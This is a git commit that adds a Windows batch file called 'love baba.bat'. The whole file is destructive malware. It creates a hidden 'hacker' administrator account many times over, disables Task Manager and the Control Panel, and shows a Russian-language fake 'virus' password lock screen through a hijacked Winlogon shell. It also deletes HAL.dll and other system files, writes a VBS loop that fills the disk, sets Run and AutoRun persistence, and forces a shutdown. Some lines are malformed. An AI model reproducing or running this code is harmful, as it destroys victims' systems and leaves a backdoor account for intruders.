a2e53383c319581413c865f635e5f662e7077aa3
Hadack <sava0402222@gmail.com>
2025-05-09 20:44:47 +0300

    by hadack

---
+++ love baba.bat
@@ -0,0 +1,189 @@
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
+reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v @C:\WINDOWS\system32\SHELL32.dll,-8964 /t REG_SZ /d love baba /F
+@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
+@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
+@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
+@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
+@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
+@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y@echo off
+chcp 1251 
+net user SUPPORT_388945a0 /delete 
+net user hacker hack /add 
+net localgroup Администраторы hacker /add 
+net localgroup Пользователи SUPPORT_388945a0 /del 
+reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
+@echo off 
+CHCP 1488
+cls 
+Set Yvaga=На вашем компьютере найден вирус. 
+Set pass=Пароль 
+Set pas=Введите пароль. 
+Set virus=Чтобы разблокировать ПК вам потребуется ввести пароль 
+Set dim=Выключаю вирус... 
+title Внимание!!! 
+CHCP 866 
+IF EXIST C:\windows\boot.bat ( 
+goto ok ) 
+cls 
+IF NOT EXIST C:\windows\boot.bat ( 
+ECHO Windows Registry Editor Version 5.00 >> C:\0.reg 
+ECHO. >> C:\0.reg 
+ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> C:\0.reg 
+ECHO. >> C:\0.reg 
+ECHO "Shell"="Explorer.exe, C:\\windows\\boot.bat " >> C:\0.reg 
+start/wait regedit -s C:\0.reg 
+del C:\0.reg 
+ECHO @echo off >>C:\windows\boot.bat 
+ECHO C:\WINDOWS\system32\taskkill.exe /f /im Explorer.exe >>C:\windows\boot.bat 
+ECHO reg add "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\system" /v DisableTaskMgr /t REG_DWORD /d 1 /f >>C:\windows\boot.bat 
+ECHO start sys.bat >>C:\windows\boot.bat 
+attrib +r +a +s +h C:\windows\boot.bat 
+copy virus.bat c:\windows\sys.bat 
+attrib +r +a +s +h C:\windows\sys.bat 
+GOTO end) 
+:ok 
+cls 
+Echo %Yvaga% 
+echo. 
+echo %virus% 
+echo %pas% 
+set /a choise = 0 
+set /p choise=%pass%: 
+if "%choise%" == "101" goto gold 
+if "%choise%" == "200393" goto status 
+exit 
+:status 
+echo %dim% 
+attrib -r -a -s -h C:\windows\boot.bat 
+del C:\windows\boot.bat 
+attrib -r -a -s -h C:\windows\sys.bat 
+del C:\windows\sys.bat 
+cls 
+:gold 
+start C:\ 
+:end
+@echo off
+msgbox "Windows Failed",16,"Windows"
+Goto x
+@echo off
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul
+del "%SystemRoot%\Media" /q >nul
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
+del "%SystemRoot%Cursors*.*" >nul
+reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v @C:\WINDOWS\system32\SHELL32.dll,-8964 /t REG_SZ /d Program web/F
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+Taskkill /f /im explorer.exe
+FOR /L %%i IN (1,1,1000000) DO txt %%i
+assoc .lnk=.hacked
+copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
+reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\batinit.bat" /f >nul
+rundll32 user,disableoemlayer
+echo System Failed
+del %systemroot%\system32\HAL.dll
+cho Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs
+echo do >> %systemdrive%\windows\system32\rundll32.vbs
+echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs
+echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs
+echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs
+echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs
+echo loop >> %systemdrive%\windows\system32\rundll32.vbs
+start %systemdrive%\windows\system32\rundll32.vbs
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f
+copy ""%0"" "%SystemRoot%\system32\Update.bat"
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\File.bat" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /f
+Pause
+@echo Тебе конец,читер!
+shutdown -s -t 1 -c "lol" >nul 
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul 
+del "%SystemRoot%\Media" /q >nul
+reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer 
+/v NoControlPanel /t REG_DWORD /d 1 /f >nul
+reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v @C:\WINDOWS\system32\SHELL32.dll,-8964 /t REG_SZ /d Bandicam 
+echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs 
+echo do >> %systemdrive%\windows\system32\rundll32.vbs 
+echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs 
+echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs 
+echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs 
+echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs 
+echo loop >> %systemdrive%\windows\system32\rundll32.vbs 
+start %systemdrive%\windows\system32\rundll32.vbs 
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f  /F
